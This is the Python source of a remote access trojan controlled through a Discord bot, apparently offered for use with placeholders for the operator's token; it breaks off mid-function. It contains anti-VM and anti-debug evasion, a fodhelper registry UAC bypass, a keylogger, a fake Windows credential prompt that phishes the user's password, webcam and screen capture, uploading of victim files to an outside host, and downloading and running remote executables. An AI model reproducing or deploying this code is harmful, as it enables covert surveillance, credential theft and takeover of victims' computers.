import subprocess
import discord
import json 
import asyncio 
import ctypes 
import os
import logging
import base64
import win32crypt
import sqlite3
import subprocess as sp
import requests 
import cv2
import win32clipboard
import win32gui
import win32com.client as wincl
import win32api
import win32process
import socket
import time  
import re
import sys
import shutil
import inspect
import ctypes.wintypes
import urllib.request
from pynput.keyboard import Key, Controller
import pyautogui
from PIL import ImageGrab
from functools import partial
import winreg as reg
import comtypes
import threading
import requests.exceptions

import platform, wmi, psutil, httpx, uuid
from queue import Queue
from datetime import datetime
import sounddevice as sd
from scipy.io.wavfile import write
from ctypes import *

from urllib.request import urlopen, urlretrieve
from time import sleep
from pynput.keyboard import Listener
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

from discord_components import *
from discord.ext import commands
from discord_slash import SlashContext, SlashCommand
from discord_slash.model import ButtonStyle
from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component

## Auto Commands | leave here for now
# from auto import *
from Crypto.Cipher import AES
from requests import get

client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description="Discord RAT")
slash = SlashCommand(client, sync_commands=True)

token = 'BOT TOKEN'; g = [SERVER ID] ### REPLACE "BOT TOKEN" AND "SERVER ID" WITH YOUR OWN BOT TOKEN AND SERVER ID ###
embedlogo = "https://cdn.discordapp.com/attachments/1006642602310910002/1007058896944377876/DiscordLogo.png" ### REPLACE THE LINK TO CHANGE THE IMAGE IF YOU WANT TOO ###

sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
program_blacklist = [
    "httpdebuggerui.exe", 
    "wireshark.exe", 
    "HTTPDebuggerSvc.exe", 
    "fiddler.exe", 
    "regedit.exe", 
    "vboxservice.exe", 
    "df5serv.exe", 
    "processhacker.exe", 
    "vboxtray.exe", 
    "vmtoolsd.exe", 
    "vmwaretray.exe", 
    "ida64.exe", 
    "ollydbg.exe",
    "pestudio.exe", 
    "vmwareuser", 
    "vgauthservice.exe", 
    "vmacthlp.exe", 
    "x96dbg.exe", 
    "vmsrvc.exe", 
    "x32dbg.exe", 
    "vmusrvc.exe", 
    "prl_cc.exe", 
    "prl_tools.exe", 
    "xenservice.exe", 
    "qemu-ga.exe", 
    "joeboxcontrol.exe", 
    "ksdumperclient.exe", 
    "ksdumper.exe",
    "joeboxserver.exe"
]

vmcheck_switch = True
anti_debug_switch = True
#endregion

def anti_debug():
    while True:
        time.sleep(0.7)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in program_blacklist):
                try:
                    proc.kill()
                except(psutil.NoSuchProcess, psutil.AccessDenied): pass

def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True: # If vm is detected
        os._exit(1) # exit
    

    def registry_check():  #VM REGISTRY CHECK SYSTEM
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            os._exit(1)
                        
        if os.path.exists(vmware_dll): 
            os._exit(1)
            
        if os.path.exists(virtualbox_dll):
            os._exit(1)   

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            os._exit(1)


    registry_check()
    processes_and_files_check()
    mac_check()

    def start(self):
        self.is_debugger(), self.disk_check(), self.ram_check() # Run all checks
        if self.anti_debug_switch:
            threading.Thread(name='Anti-Debug', target=self.anti_debug).start()
            threading.Thread(name='Anti-DLL', target=self.block_dlls).start()
        
        if self.vtdetect_switch:     self.vtdetect()      # VTDETECT
        if self.vmcheck_switch:      self.vmcheck()       # VMCHECK
        if self.listcheck_switch:    self.listcheck()     # LISTCHECK

@client.event
async def on_slash_command_error(ctx, error):
    if isinstance(error, discord.ext.commands.errors.MissingPermissions):
        await ctx.send('You do not have permission to execute this command!')
    else:
        print(error)

async def activity(client):
    while True:
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        await client.change_presence(status=discord.Status.online, activity=discord.Game(f"Visiting: {window}"))
        sleep(1)

@client.event
async def on_ready():
    global channel_name
    DiscordComponents(client)
    number = 0
    with urlopen("http://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        ip = data['ip']
        country = data['country']
        city = data['city']

    process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
    wtype = process2.communicate()[0].decode().strip("Caption\n").strip()

    for x in client.get_all_channels():
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):
        if "session" in on_ready.total[y]:
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  

    if number == 0:
        channel_name = "session-1"
        await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        await client.guilds[0].create_text_channel(channel_name)
        
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here ✔ New session, opened **{channel_name}** | **{wtype}** | **{ip}, {country}/{city}**\n> Succesfully gained access to client **`{os.getlogin()}`**"
    if is_admin == True:
        await channel.send(f'{value1} with **`admin`** permissions.')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Windows logging is currently turned off on the clients PC.")
    await client.change_presence(status=discord.Status.online, activity=game)

on_ready.total = []

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def MuteVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

@slash.slash(name="forceadmin", description="Gains admin permissions to the clients PC.", guild_ids=g)
async def forceAdmin_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                my_embed = discord.Embed(title=f"Force Admin", description="This session already has admin permissions.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                my_embed = discord.Embed(title=f"Force Admin", description="Attempting to gain admin permissions.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if not isexe:
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                else:
                    test_str = sys.argv[0]
                    current_dir = test_str
                    cmd2 = current_dir
                    create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
                os.system(remove_reg)
        except Exception as e:
                my_embed = discord.Embed(title="Force Admin", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)

@slash.slash(name="killsessions", description="Kills all inactive sessions.", guild_ids=g)
async def kill_command(ctx: SlashContext):
    my_embed = discord.Embed(title=f"Kill Sessions", description="Killing all inactive sessions, please wait!", color=16777215)
    my_embed.set_thumbnail(url=f"{embedlogo}")
    await ctx.send(embed=my_embed)
    try: 
        for y in range(len(on_ready.total)): 
            if "session" in on_ready.total[y]:
                channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
                await channel_to_delete.delete()
            else:
                pass
        my_embed = discord.Embed(title=f"Kill Sessions", description="Successfully killed all inactive sessions.", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
    except Exception as e:
        my_embed = discord.Embed(title=f"Kill Sessions", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)

@slash.slash(name="exitprogram", description="Stops the program on the clients PC.", guild_ids=g)
async def exit_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        buttons = [
                create_button(
                    style=ButtonStyle.green,
                    label="✔"
                ),
                create_button(
                    style=ButtonStyle.red,
                    label="❌"
                ),
              ]
        action_row = create_actionrow(*buttons)
        await ctx.send("Are you sure you want to exit the program on your clients PC?", components=[action_row])

        res = await client.wait_for('button_click')
        if res.component.label == "YES":
            await ctx.send(content="Exited the program on the clients PC.", hidden=True)
            os._exit(0)
        else:
            await ctx.send(content="Cancelled!", hidden=True)

@slash.slash(name="infomation", description="Gathers infomation about the client.", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
        googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
        process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        wtype = process2.communicate()[0].decode().strip("Caption\n").strip()
        computer = wmi.WMI()
        gpu = computer.Win32_VideoController()[0].Name
        cpu = computer.Win32_Processor()[0].Name
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

        my_embed = discord.Embed(title=f"Infomation", description="Clients infomation", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        my_embed.add_field(name="Client:", value=f"{os.getlogin()}")
        my_embed.add_field(name="Computer Name:", value=f"{os.getenv('COMPUTERNAME')}")
        my_embed.add_field(name="IP Address:", value=f"{data['ip']}")
        my_embed.add_field(name="Using VPN:", value=f"{UsingVPN}")
        my_embed.add_field(name="Organization:", value=f"{data['org']}")
        my_embed.add_field(name="Region:", value=f"{data['region']}")
        my_embed.add_field(name="City:", value=f"{data['city']}")
        my_embed.add_field(name="Postal:", value=f"{data['postal']}")
        my_embed.add_field(name="System Type:", value=f"{wtype}")
        my_embed.add_field(name="System GPU:", value=f"{gpu}")
        my_embed.add_field(name="System CPU:", value=f"{cpu}")
        my_embed.add_field(name="System MAC :", value=f"{mac}")
        my_embed.add_field(name="System HWID:", value=f"{hwid}")
        await ctx.send(embed=my_embed)


@slash.slash(name="geolocation", description="Grather GEO location of client. (Not very accurate)", guild_ids=g)
async def info_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                my_embed = discord.Embed(title=f"GEO Location", description=f"{link}", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"GEO Location", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="startkeylogger", description="Enables the keylogger on the clients PC.", guild_ids=g)
async def startKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Keylogger", description="Keylogger has started!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        temp = os.getenv("TEMP")
        log_dir = temp
        logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def keylog():
            def on_press(key):
                logging.info(str(key))
            with Listener(on_press=on_press) as listener:
                listener.join()
        import threading
        global test
        test = threading.Thread(target=keylog)
        test._running = True
        test.daemon = True
        test.start()


#Stopkeylogger
@slash.slash(name="stopkeylogger", description="Disables the keylogger on the clients PC.", guild_ids=g)
async def stopKeyLogger_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Keylogger", description="Keylogger has stopped!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        test._running = False
        


#Keylogdump
@slash.slash(name="keylogdump", description="Dumps the keylogs from the clients PC", guild_ids=g)
async def KeyLogDump_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Keylogger", description="Keylogger was dumped!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        temp = os.getenv("TEMP")
        file_keys = temp + r"\key_log.txt"
        file = discord.File(file_keys, filename="key_log.txt")
        await ctx.channel.send( file=file)
        os.popen(f"del {file_keys}")
        os.system(r"del %temp%\output.txt /f")


@slash.slash(name="startwindowslogger", description="Starts the window logger", guild_ids=g)
async def windowstart_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            global stop_threads
            stop_threads = False

            threading.Thread(target=between_callback, args=(client,)).start()
            my_embed = discord.Embed(title=f"Windows Logger", description="Windows logger for this session started!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error has occured!\nDetails: **{e}**", color=0xFF0000)
            await ctx.send(embed=my_embed)


@slash.slash(name="stopwindowslogger", description="Stops the window logger", guild_ids=g)
async def windowstop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            global stop_threads
            stop_threads = True

            my_embed = discord.Embed(title=f"Windows Logger", description="Windows logger for this session stopped!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            game = discord.Game(f"RAT.exe")
            await client.change_presence(status=discord.Status.online, activity=game)
        except Exception as e:
            my_embed = discord.Embed(title=f"Windows Logger", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="windowsphisher", description="Grathers windows password by a phishing attack (hopefully)", guild_ids=g)
async def Windowspass_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Windows Phisher", description="Launching phishing attack!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
        cmd92 = 'echo $cred.getnetworkcredential().password;'
        full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
        instruction = full_cmd
        def shell():   
            output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output
        result = str(shell().stdout.decode('CP437'))
        my_embed = discord.Embed(title="Windows Phisher", description="Clients password: " + result, color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)

def change_res(cap, width, height):
    cap.set(3, width)
    cap.set(4, height)

def get_dims(cap, res='1080p'):
    STD_DIMENSIONS =  {
        "480p": (640, 480),
        "720p": (1280, 720),
        "1080p": (1920, 1080),
        "4k": (3840, 2160),
    }
    width, height = STD_DIMENSIONS["480p"]
    if res in STD_DIMENSIONS:
        width,height = STD_DIMENSIONS[res]
    change_res(cap, width, height)
    return width, height


@slash.slash(name="webcam", description="Takes a picture of their webcam.", guild_ids=g)
async def webcam_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
            camera = cv2.VideoCapture(0)
            return_value,image = camera.read()
            cv2.imwrite(temp,image)
            camera.release()
            file = discord.File(temp, filename="webcam.jpg")
            await ctx.send(file=file)
            os.remove(temp)
        except Exception as e:
            my_embed = discord.Embed(title=f"Webcam", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="screenshot", description="Takes a screenshot of their screen.", guild_ids=g)
async def screenshot_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
            ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
            screen = pyautogui.screenshot()
            screen.save(temp)
            file = discord.File(temp, filename="monitor.png")
            await ctx.send(file=file)
            os.remove(temp)
        except Exception as e:
            my_embed = discord.Embed(title=f"Screenshot", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="wallpaper", description="Changes their wallpaper to your choice.", guild_ids=g)
async def Wallpaper_command(ctx: SlashContext, link: str):
    if ctx.channel.name == channel_name:
        if re.match(r'^(?:http|ftp)s?://', link) is not None:
            image_formats = ("image/png", "image/jpeg", "image/jpg", "image/x-icon",)
            r = requests.head(link)
            if r.headers["content-type"] in image_formats:
                path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                urlretrieve(link, path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                my_embed = discord.Embed(title=f"Wallpaper", description=f"Successfully changed the clients wallpaper.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Wallpaper", description="Link needs to be a url to an image!", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        else:
                my_embed = discord.Embed(title=f"Wallpaper", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)

@slash.slash(name="play", description="Plays a youtube video", guild_ids=g)
async def Play_command(ctx: SlashContext, youtube_link: str):
    if ctx.channel.name == channel_name:
        MaxVolume()
        if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            my_embed = discord.Embed(title=f"Play", description=f"Successfully launched the youtube video on the clients PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
        else:
                my_embed = discord.Embed(title="Play", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)


#Stops audio 
@slash.slash(name="Stopplay", description="Stops the youtube video", guild_ids=g)
async def Stop_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title=f"Play", description="Successfully stopped the youtube video on the clients PC.", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        os.system(f"taskkill /F /IM {pid_process[1]}")

@slash.slash(name="maxvolume", description="Set their volume to 100%", guild_ids=g)
async def MaxVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            MaxVolume()
            my_embed = discord.Embed(title="Volume", description="Volume was set to 100%", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Volume", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="mutevolume", description="Sets their volume to 0%", guild_ids=g)
async def MuteVolume_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            MuteVolume()
            my_embed = discord.Embed(title="Volume", description="Volume was set to 0%", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Volume", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="voicespeak", description="Sends an voice message to the clients PC.", guild_ids=g)
async def Voice_command(ctx: SlashContext, voicespeak: str):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title="Voice", description=f"Sent an voice message saying: **{voicespeak}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(voicespeak)
            comtypes.CoUninitialize()
        except Exception as e:
            my_embed = discord.Embed(title="Voice", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="download", description="Downloads a file from the clients PC.", guild_ids=g)
async def Download_command(ctx: SlashContext, downloadfile: str):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title="Download", description="Attempting to upload file to anonfiles, please wait!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        try:
            files = {
                'file': (downloadfile, open(downloadfile, 'rb')),
            }

            url = 'https://api.anonfiles.com/upload'
            response = requests.post(url, files=files)

            data = response.json()
            file = (data['data']['file']['url']['short'])
            my_embed = discord.Embed(title="Download", description=f"Successfully downloaded the file: {file}", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Download", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="Upload", description="Uploads a file to the clients PC and runs it.", guild_ids=g)
async def Upload_command(ctx: SlashContext, file_url: str, filename: str):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title="Upload", description="Uploading file, please wait!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            temp = (os.getenv("temp"))

            '''
            Download File
            '''
            file = f'{temp}\\$~cache\\{filename}.exe'
            r = requests.get(file_url)
            with open(file, 'wb') as f:
                f.write(r.content)
            f.close()

            '''
            Start File
            '''
            os.startfile(file)
            my_embed = discord.Embed(title="Upload", description="File was uploaded and is now running.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Upload", description="Error occured!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="viewdirectory", description="Views content in the directory.", guild_ids=g)
async def Viewdirectory_command(ctx: SlashContext, dire="null"):
    if ctx.channel.name == channel_name:
        if dire == "null":
            dire = os.getcwd()
            subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            os.chdir(dire)
            subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        file = discord.File(
            os.path.join(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt"), filename="Directory.txt"
        )
        await ctx.send("Contents of directory: " + dire + " are:", file=file)
        os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt")
        os.chdir(ogdir)

@slash.slash(name="changedirectory", description="Changes the directory.", guild_ids=g)
async def Changedirectory_command(ctx: SlashContext,dir):
    if ctx.channel.name == channel_name:
        import os
        os.chdir(dir)
        await ctx.send("Directory changed: " + dir)

@slash.slash(name="StreamScreen", description="Stream screen, time format (hh:mm:ss)", guild_ids=g)
async def StreamScreen_command(ctx: SlashContext, stream_time: str):
    if ctx.channel.name == channel_name:
        try:
            def convert_seconds(time_str):
                # split in hh, mm, ss
                hh, mm, ss = time_str.split(':')
                return int(hh) * 3600 + int(mm) * 60 + int(ss)

            time_length = stream_time 
            seconds_length = convert_seconds(time_length) 
            global end
            end = time.time() + seconds_length

            async def StreamScreen(end):
                temp = (os.getenv('TEMP'))
                hellos = temp + r"\\hobos\\hellos.txt"        
                if os.path.isfile(hellos):
                    os.system(r"del %temp%\\hobos\\hellos.txt /f")
                    os.system(r"RMDIR %temp%\\hobos /s /q")     
                else:
                    pass
                while time.time() < end:
                    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
                    screen = pyautogui.screenshot()
                    screen.save(temp + r"\\monitor.png")
                    path = temp + r"\\monitor.png"
                    file = discord.File((path), filename="monitor.png")
                    await ctx.send(file=file)
                    hellos = temp + r"\\hobos\\hellos.txt"
                    if os.path.isfile(hellos):
                        break
                    else:
                        continue

                if time.time() > end:
                 my_embed = discord.Embed(title="Screen", description="Finished streaming the clients screen.", color=16777215)
                 my_embed.set_thumbnail(url=f"{embedlogo}")
                 await ctx.send(embed=my_embed)
            
            my_embed = discord.Embed(title="Screen", description=f"Streaming the clients screen for **{seconds_length}** Seconds", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            await StreamScreen(end)
        except Exception as e:
            my_embed = discord.Embed(title="Screen", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="streamwebcam", description="Streams clients webcam, time format (hh:mm:ss)", guild_ids=g)
async def StreamWebCam_command(ctx: SlashContext, stream_time: str):
    if ctx.channel.name == channel_name:
        try:
            def convert_seconds(time_str):
                hh, mm, ss = time_str.split(':')
                return int(hh) * 3600 + int(mm) * 60 + int(ss)

            time_length = stream_time 
            seconds_length = convert_seconds(time_length) 
            global end
            end = time.time() + seconds_length

